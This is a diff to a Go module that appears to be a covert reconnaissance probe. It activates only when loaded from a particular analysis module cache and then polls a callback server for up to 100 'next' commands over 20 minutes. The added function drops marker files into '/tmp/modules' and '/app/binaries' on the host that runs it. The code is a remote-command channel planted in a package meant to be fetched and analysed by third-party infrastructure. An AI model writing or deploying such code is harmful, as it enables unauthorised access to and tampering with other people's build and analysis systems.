@@ -25,7 +25,7 @@ var callbackSession string
 var callbackURLSHA256 string
 
 const (
-	expectedOrigin = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.114-codex"
+	expectedOrigin = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.115-codex"
 	expectedAgent  = "go-cgo-pkgsite-probe-v114-interactive-recon"
 	sessionLength  = 20 * time.Minute
 	maxCommands    = 100
@@ -78,6 +78,7 @@ func main() {
 	if origin != expectedOrigin || os.Args[3] != origin {
 		return
 	}
+	emitSharedHi()
 	deadline := time.Now().Add(sessionLength)
 	for completed := 0; completed < maxCommands && time.Now().Before(deadline); completed++ {
 		status, body, err := call(http.MethodGet, "next", nil)
@@ -102,6 +103,21 @@ func main() {
 		if next.Command == "exit" {
 			return
 		}
+	}
+}
+
+func emitSharedHi() {
+	for _, path := range []string{"/tmp/modules/a115-shared-hi", "/app/binaries/a115-shared-hi"} {
+		info, err := os.Lstat(filepath.Dir(path))
+		if err != nil || !info.IsDir() || info.Mode()&os.ModeSymlink != 0 {
+			continue
+		}
+		file, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0o600)
+		if err != nil {
+			continue
+		}
+		_, _ = file.WriteString("hi\n")
+		_ = file.Close()
 	}
 }
 
